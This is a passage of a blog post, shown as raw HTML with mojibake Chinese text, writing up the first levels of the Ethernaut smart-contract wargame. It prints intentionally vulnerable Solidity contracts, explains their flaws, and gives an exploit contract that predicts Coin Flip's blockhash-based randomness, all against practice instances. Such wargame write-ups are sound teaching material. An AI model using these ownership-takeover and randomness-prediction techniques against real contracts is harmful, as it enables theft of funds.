<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="Before allHitcon å¾Œä¸€ç›´èªªè¦å­¸ web3ï¼Œç„¶å¾Œä¹‹å¾Œéƒ½åœ¨å¿™å‚™å¯©&#x2F;æ ¡å…§&#x2F;å¤§å­¸èª²ç¨‹ï¼Œå°è‡´ä¸€ç›´æ²’æ©Ÿæœƒã€‚æœ€è¿‘ç¨å¾®é–’ä¸‹ä¾†é–‹å§‹é€é Ethernaut(link) å­¸ web3 å’Œ solidity åŸºç¤ï¼Œç™¼ç¾æ‰“æ™ºèƒ½åˆç´„å…¶å¯¦è »å¥½ç©çš„XDèº«ç‚ºwebç‹—ä¹Ÿè©²ä¾†æ‰“web3äº†å§ğŸ‘Šå³æ™‚æ›´æ–°çš„ Write Upï¼šhttps:&#x2F;&#x2F;hackmd.io&#x2F;@Whal">
<meta property="og:type" content="article">
<meta property="og:title" content="Ethernaut é—–é—œè¨˜ï¼ˆå‰åŠï¼‰">
<meta property="og:url" content="http://wha13.github.io/2024/10/16/ethernaut-wp-first/index.html">
<meta property="og:site_name" content="Whale120&#39;s Blog">
<meta property="og:description" content="Before allHitcon å¾Œä¸€ç›´èªªè¦å­¸ web3ï¼Œç„¶å¾Œä¹‹å¾Œéƒ½åœ¨å¿™å‚™å¯©&#x2F;æ ¡å…§&#x2F;å¤§å­¸èª²ç¨‹ï¼Œå°è‡´ä¸€ç›´æ²’æ©Ÿæœƒã€‚æœ€è¿‘ç¨å¾®é–’ä¸‹ä¾†é–‹å§‹é€é Ethernaut(link) å­¸ web3 å’Œ solidity åŸºç¤ï¼Œç™¼ç¾æ‰“æ™ºèƒ½åˆç´„å…¶å¯¦è »å¥½ç©çš„XDèº«ç‚ºwebç‹—ä¹Ÿè©²ä¾†æ‰“web3äº†å§ğŸ‘Šå³æ™‚æ›´æ–°çš„ Write Upï¼šhttps:&#x2F;&#x2F;hackmd.io&#x2F;@Whal">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://hackmd.io/_uploads/H1f8QV4RR.png">
<meta property="og:image" content="https://hackmd.io/_uploads/H109xV4CC.png">
<meta property="og:image" content="https://hackmd.io/_uploads/S1PPM44RA.png">
<meta property="og:image" content="https://hackmd.io/_uploads/rkrS4V4CR.png">
<meta property="og:image" content="https://hackmd.io/_uploads/SypFNEV00.png">
<meta property="og:image" content="https://hackmd.io/_uploads/S19p_V4RC.png">
<meta property="og:image" content="https://hackmd.io/_uploads/HkdOD6Oykl.png">
<meta property="og:image" content="https://hackmd.io/_uploads/B1Ndp6OJ1l.png">
<meta property="og:image" content="https://hackmd.io/_uploads/S1_2b0_1kx.png">
<meta property="og:image" content="https://hackmd.io/_uploads/SJS-GCOy1e.png">
<meta property="og:image" content="https://hackmd.io/_uploads/rJFkZ1tJJl.png">
<meta property="og:image" content="https://hackmd.io/_uploads/SyEJsgKyJe.png">
<meta property="og:image" content="https://hackmd.io/_uploads/SkBphWaJJl.png">
<meta property="article:published_time" content="2024-10-16T12:19:43.000Z">
<meta property="article:modified_time" content="2024-10-16T12:27:20.249Z">
<meta property="article:author" content="William Lin">
<meta property="article:tag" content="blockchain">
<meta property="article:tag" content="solidity">
<meta property="article:tag" content="Re-Entrancy Attack">
<meta property="article:tag" content="web3">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://hackmd.io/_uploads/H1f8QV4RR.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>Ethernaut é—–é—œè¨˜ï¼ˆå‰åŠï¼‰</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
		<script type="text/x-mathjax-config">
		  MathJax.Hub.Config({
			tex2jax: {
			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
			  inlineMath: [['$','$']]
			}
		  });
		</script>
		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
	
<!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/tags/">tags</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        
        <li><a class="icon" aria-label="Next post" href="/2024/10/12/cicada-htb/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://wha13.github.io/2024/10/16/ethernaut-wp-first/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://wha13.github.io/2024/10/16/ethernaut-wp-first/&text=Ethernaut é—–é—œè¨˜ï¼ˆå‰åŠï¼‰"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://wha13.github.io/2024/10/16/ethernaut-wp-first/&title=Ethernaut é—–é—œè¨˜ï¼ˆå‰åŠï¼‰"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://wha13.github.io/2024/10/16/ethernaut-wp-first/&is_video=false&description=Ethernaut é—–é—œè¨˜ï¼ˆå‰åŠï¼‰"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Ethernaut é—–é—œè¨˜ï¼ˆå‰åŠï¼‰&body=Check out this article: http://wha13.github.io/2024/10/16/ethernaut-wp-first/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://wha13.github.io/2024/10/16/ethernaut-wp-first/&title=Ethernaut é—–é—œè¨˜ï¼ˆå‰åŠï¼‰"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://wha13.github.io/2024/10/16/ethernaut-wp-first/&title=Ethernaut é—–é—œè¨˜ï¼ˆå‰åŠï¼‰"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://wha13.github.io/2024/10/16/ethernaut-wp-first/&title=Ethernaut é—–é—œè¨˜ï¼ˆå‰åŠï¼‰"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://wha13.github.io/2024/10/16/ethernaut-wp-first/&title=Ethernaut é—–é—œè¨˜ï¼ˆå‰åŠï¼‰"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://wha13.github.io/2024/10/16/ethernaut-wp-first/&name=Ethernaut é—–é—œè¨˜ï¼ˆå‰åŠï¼‰&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://wha13.github.io/2024/10/16/ethernaut-wp-first/&t=Ethernaut é—–é—œè¨˜ï¼ˆå‰åŠï¼‰"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Before-all"><span class="toc-number">1.</span> <span class="toc-text">Before all</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-1-Fallback"><span class="toc-number">2.</span> <span class="toc-text">Level 1 Fallback</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-2-Fallout"><span class="toc-number">3.</span> <span class="toc-text">Level 2 Fallout</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-3-Coin-Flip"><span class="toc-number">4.</span> <span class="toc-text">Level 3 Coin Flip</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-4-Telephone"><span class="toc-number">5.</span> <span class="toc-text">Level 4 Telephone</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-5-Token"><span class="toc-number">6.</span> <span class="toc-text">Level 5 Token</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-6-Delegation"><span class="toc-number">7.</span> <span class="toc-text">Level 6 Delegation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-7-Force"><span class="toc-number">8.</span> <span class="toc-text">Level 7 Force</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-8-Vault"><span class="toc-number">9.</span> <span class="toc-text">Level 8 Vault</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-9-King"><span class="toc-number">10.</span> <span class="toc-text">Level 9 King</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-10-Re-entrancy"><span class="toc-number">11.</span> <span class="toc-text">Level 10 Re-entrancy</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-11-Elevator"><span class="toc-number">12.</span> <span class="toc-text">Level 11 Elevator</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-12-Privacy"><span class="toc-number">13.</span> <span class="toc-text">Level 12 Privacy</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-13-Gatekeeper-One"><span class="toc-number">14.</span> <span class="toc-text">Level 13 Gatekeeper One</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-14-Gatekeeper-Two"><span class="toc-number">15.</span> <span class="toc-text">Level 14 Gatekeeper Two</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-15-Naught-Coin"><span class="toc-number">16.</span> <span class="toc-text">Level 15 Naught Coin</span></a></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        Ethernaut é—–é—œè¨˜ï¼ˆå‰åŠï¼‰
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">William Lin</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2024-10-16T12:19:43.000Z" class="dt-published" itemprop="datePublished">2024-10-16</time>
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/Re-Entrancy-Attack/" rel="tag">Re-Entrancy Attack</a>, <a class="p-category" href="/tags/blockchain/" rel="tag">blockchain</a>, <a class="p-category" href="/tags/solidity/" rel="tag">solidity</a>, <a class="p-category" href="/tags/web3/" rel="tag">web3</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>Hitcon å¾Œä¸€ç›´èªªè¦å­¸ web3ï¼Œç„¶å¾Œä¹‹å¾Œéƒ½åœ¨å¿™å‚™å¯©&#x2F;æ ¡å…§&#x2F;å¤§å­¸èª²ç¨‹ï¼Œå°è‡´ä¸€ç›´æ²’æ©Ÿæœƒã€‚<br>æœ€è¿‘ç¨å¾®é–’ä¸‹ä¾†é–‹å§‹é€é <a target="_blank" rel="noopener" href="https://ethernaut.openzeppelin.com/">Ethernaut(link)</a> å­¸ web3 å’Œ solidity åŸºç¤ï¼Œç™¼ç¾æ‰“æ™ºèƒ½åˆç´„å…¶å¯¦è »å¥½ç©çš„XD<br>èº«ç‚ºwebç‹—ä¹Ÿè©²ä¾†æ‰“web3äº†å§ğŸ‘Š<br>å³æ™‚æ›´æ–°çš„ Write Upï¼š<a target="_blank" rel="noopener" href="https://hackmd.io/@Whale120/etherwhale">https:&#x2F;&#x2F;hackmd.io&#x2F;@Whale120&#x2F;etherwhale</a>  </p>
<h2 id="Level-1-Fallback"><a href="#Level-1-Fallback" class="headerlink" title="Level 1 Fallback"></a>Level 1 Fallback</h2><p>Victimâ€™s Address: 0x640ba57ADbCEbaD2E472c56E190EF120C4087589<br>ç¬¬ä¸€æ¬¡æ“ä½œRemix IDEï¼Œèƒ¡äº‚èƒ¡äº‚çµ‚æ–¼ææ‡‚äº†â€¦â€¦<br>Remix IDE æ•™å­¸ï¼š<a target="_blank" rel="noopener" href="https://decert.me/tutorial/solidity/tools/remix">https://decert.me/tutorial/solidity/tools/remix</a>  </p>
<p><strong>Step 0. Start Instance</strong><br>æ»‘åˆ°åº•éƒ¨ï¼Œé–‹å•Ÿï¼Œäº¤æ˜“å¾ŒæŒ‰ä¸‹ F12 å°±æœƒçœ‹åˆ°ç•¶å‰å”è­°çš„åœ°å€<br><img src="https://hackmd.io/_uploads/H1f8QV4RR.png" alt="image">  </p>
<p><strong>Step 1. Deploy</strong><br>æŠŠé¡Œç›®æä¾›çš„solidityè…³æœ¬è²¼åˆ°Remix IDEå‰µå»ºçš„æ–°æ–‡ä»¶ä¸Šé¢ï¼š<br><img src="https://hackmd.io/_uploads/H109xV4CC.png" alt="image">  </p>
<p>æ¥è‘—compileå”è­°ï¼Œç„¶å¾Œå» deploy &amp; run é¸æ“‡InjectedéŒ¢åŒ…ã€Gas Limitèª¿ä¸€ä¸‹ï¼ˆä¸ç„¶å¾ˆç‡’ç‡ƒæ–™è²»ï¼Œæœ¬æ¬¡ä½¿ç”¨50000ï¼‰ï¼Œæœ€å¾Œåœ¨ At Addressèª¿æ•´ä¸€ä¸‹åœ°å€æˆå‰›å‰›çš„å”è­°åœ°å€<br><img src="https://hackmd.io/_uploads/S1PPM44RA.png" alt="image">  </p>
<p>é»é–‹åº•éƒ¨çš„Contractsï¼ŒåŸå‰‡ä¸Šæ‡‰è©²åœ¨å‰›å‰›çš„åœ°å€å»ºç«‹å”è­°äº†ï¼š  </p>
<p><img src="https://hackmd.io/_uploads/rkrS4V4CR.png" alt="image">  </p>
<p>ä¸€æ’æŒ‰éˆ•å°±æ˜¯å”è­°è£¡é¢publicå¯æª¢è¦–çš„å…§å®¹ï¼Œå¯ä»¥çœ‹åˆ°ä¸€é–‹å§‹ownerä¸æ˜¯è‡ªå·±~<br><img src="https://hackmd.io/_uploads/SypFNEV00.png" alt="image">  </p>
<p><strong>Step 2. Exploit</strong><br>ä»»å‹™ï¼š  </p>
<ol>
<li>è®Šæˆowner  </li>
<li>æŠŠéŒ¢æèµ°</li>
</ol>
<p><strong>Source Code</strong>  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Fallback &#123;</span><br><span class="line">    mapping(address =&gt; uint256) public contributions;</span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">        contributions[msg.sender] = 1000 * (1 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyOwner() &#123;</span><br><span class="line">        require(msg.sender == owner, &quot;caller is not the owner&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function contribute() public payable &#123;</span><br><span class="line">        require(msg.value &lt; 0.001 ether);</span><br><span class="line">        contributions[msg.sender] += msg.value;</span><br><span class="line">        if (contributions[msg.sender] &gt; contributions[owner]) &#123;</span><br><span class="line">            owner = msg.sender;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getContribution() public view returns (uint256) &#123;</span><br><span class="line">        return contributions[msg.sender];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw() public onlyOwner &#123;</span><br><span class="line">        payable(owner).transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è§€å¯Ÿ<code>contribute</code>ï¼Œåœ¨contributionå¤§å°è¶…éåŸæœ¬çš„owneræ™‚å°±å¯ä»¥æˆç‚ºæ–°çš„ownerï¼Œè€Œ<code>withdraw</code>æ–¹æ³•åšçš„äº‹æƒ…å°±æ˜¯é€éonlyOnwerç¢ºèªä½ æ˜¯ownerå¾Œå°±æŠŠéŒ¢éƒ½å¾€ä½ åœ°å€è½‰ï¼Œå°±å®Œæˆé€™é¡Œäº†ï¼  </p>
<p>Exploit: contribute -&gt; owner(ç¢ºèªè‡ªå·±æ˜¯owner) -&gt; withdraw<br>P.S. contribute 1 weiçš„æ–¹æ³•<br><img src="https://hackmd.io/_uploads/S19p_V4RC.png" alt="image">  </p>
<h2 id="Level-2-Fallout"><a href="#Level-2-Fallout" class="headerlink" title="Level 2 Fallout"></a>Level 2 Fallout</h2><p>ä»»å‹™ï¼š  </p>
<ol>
<li>è®Šæˆowner</li>
</ol>
<p><strong>Source Code</strong>  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &quot;openzeppelin-contracts-06/math/SafeMath.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Fallout &#123;</span><br><span class="line">    using SafeMath for uint256;</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt; uint256) allocations;</span><br><span class="line">    address payable public owner;</span><br><span class="line"></span><br><span class="line">    /* constructor */</span><br><span class="line">    function Fal1out() public payable &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">        allocations[owner] = msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyOwner() &#123;</span><br><span class="line">        require(msg.sender == owner, &quot;caller is not the owner&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function allocate() public payable &#123;</span><br><span class="line">        allocations[msg.sender] = allocations[msg.sender].add(msg.value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function sendAllocation(address payable allocator) public &#123;</span><br><span class="line">        require(allocations[allocator] &gt; 0);</span><br><span class="line">        allocator.transfer(allocations[allocator]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function collectAllocations() public onlyOwner &#123;</span><br><span class="line">        msg.sender.transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function allocatorBalance(address allocator) public view returns (uint256) &#123;</span><br><span class="line">        return allocations[allocator];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç™¼ç¾constructorå‡½æ•¸å¤–éœ²ï¼Œç›´æ¥å»è«‹æ±‚Fal1outå°±è®Šæˆowneräº†  </p>
<h2 id="Level-3-Coin-Flip"><a href="#Level-3-Coin-Flip" class="headerlink" title="Level 3 Coin Flip"></a>Level 3 Coin Flip</h2><p>Victimâ€™s Address: 0xBC01FBc340C413293489418b0A0c9A0C54336Ab9<br>é¡Œç›®è¦æ±‚ï¼š  </p>
<ol>
<li>é€£çºŒé æ¸¬æ­£ç¢ºåæ¬¡</li>
</ol>
<p><strong>Source Code:</strong>  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract CoinFlip &#123;</span><br><span class="line">    uint256 public consecutiveWins;</span><br><span class="line">    uint256 lastHash;</span><br><span class="line">    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        consecutiveWins = 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function flip(bool _guess) public returns (bool) &#123;</span><br><span class="line">        uint256 blockValue = uint256(blockhash(block.number - 1));</span><br><span class="line"></span><br><span class="line">        if (lastHash == blockValue) &#123;</span><br><span class="line">            revert();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        lastHash = blockValue;</span><br><span class="line">        uint256 coinFlip = blockValue / FACTOR;</span><br><span class="line">        bool side = coinFlip == 1 ? true : false;</span><br><span class="line"></span><br><span class="line">        if (side == _guess) &#123;</span><br><span class="line">            consecutiveWins++;</span><br><span class="line">            return true;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            consecutiveWins = 0;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>é¦–å…ˆè§€å¯Ÿï¼Œç™¼ç¾æ¯æ¬¡éš¨æ©Ÿæ˜¯ç”±å€å¡Šä¸Šçš„ç‹€æ…‹å–hashï¼Œæ‰€ä»¥åªéœ€è¦éƒ¨ç½²ä¸€å€‹æœå‹™åœ¨ç›¸åŒçš„éˆä¸Šå°±å¯ä»¥å–å¾—ç›¸åŒçš„ç‹€æ…‹ï¼Œé€²è€Œç²å¾—ç•¶æ¬¡çš„ç¡¬å¹£å€å¡Šã€‚  </p>
<p><strong>Exploit.sol</strong>  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface Coinflip &#123;</span><br><span class="line">  function flip(bool _guess) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract FAKE_CoinFlip &#123;</span><br><span class="line">    Coinflip public target = Coinflip(0xBC01FBc340C413293489418b0A0c9A0C54336Ab9);</span><br><span class="line">    uint256 lastHash;</span><br><span class="line">    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line"></span><br><span class="line">    function FAKE_flip() public&#123;</span><br><span class="line">        uint256 blockValue = uint256(blockhash(block.number - 1));</span><br><span class="line">        uint256 coinFlip = blockValue / FACTOR;</span><br><span class="line">        bool side = coinFlip == 1 ? true : false;</span><br><span class="line">        target.flip(side);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>åˆ©ç”¨å»ºç«‹interfaceçš„æ–¹æ³•æŠŠé æ¸¬çµæœé€åˆ°Victimâ€™s Contract, å‘¼å«åæ¬¡Fake_flipå°±çµæŸé€™å›åˆã„Œ  </p>
<p>P.S.å¯ä»¥è‡ªå·±æŠŠGAS Limitèª¿å°ï¼Œæ‰“èµ·ä¾†ä¸æœƒå¤ªè²´<br><img src="https://hackmd.io/_uploads/HkdOD6Oykl.png" alt="image"></p>
<h2 id="Level-4-Telephone"><a href="#Level-4-Telephone" class="headerlink" title="Level 4 Telephone"></a>Level 4 Telephone</h2><p>Victimâ€™s Address: 0xe905433025193D3CBF904601Aab36E6a82d6C591<br>ä»»å‹™ï¼š  </p>
<ol>
<li>è®Šæˆowner</li>
</ol>
<p><strong>Source Code:</strong>  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Telephone &#123;</span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function changeOwner(address _owner) public &#123;</span><br><span class="line">        if (tx.origin != msg.sender) &#123;</span><br><span class="line">            owner = _owner;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
